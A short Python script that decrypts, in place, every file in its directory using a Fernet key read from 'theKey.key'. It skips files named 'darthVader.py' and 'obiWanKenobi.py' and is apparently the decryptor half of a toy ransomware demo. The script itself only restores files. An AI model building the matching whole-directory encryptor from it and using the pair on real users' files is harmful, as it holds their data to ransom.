import os
from cryptography.fernet import Fernet

files = []

for file in os.listdir():
    if file == "darthVader.py" or file == "theKey.key" or file == "obiWanKenobi.py":
        continue
    if os.path.isfile(file):
        files.append(file)


with open("theKey.key","rb") as key:
    secretKey = key.read()


for file in files:
    with open(file,"rb") as theFile:
        contents = theFile.read()
    contents_decrypted = Fernet(secretKey).decrypt(contents)
    with open(file,"wb") as theFile:
        theFile.write(contents_decrypted)